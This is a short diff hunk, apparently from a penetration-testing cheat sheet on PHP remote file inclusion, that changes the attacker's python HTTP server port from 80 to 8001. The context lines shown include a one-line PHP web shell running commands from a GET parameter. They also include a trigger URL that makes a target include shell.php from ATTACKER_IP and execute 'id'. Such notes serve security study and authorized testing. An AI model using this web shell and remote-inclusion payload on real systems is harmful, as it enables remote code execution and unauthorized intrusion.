@@ -438,7 +438,7 @@ Requires `allow_url_include=On` (disabled by default on modern PHP)
 <?php system($_GET['cmd']); ?>
 
 # Start server
-python3 -m http.server 80
+python3 -m http.server 8001
 
 # Trigger
 http://target.com/?language=http://ATTACKER_IP/shell.php&cmd=id
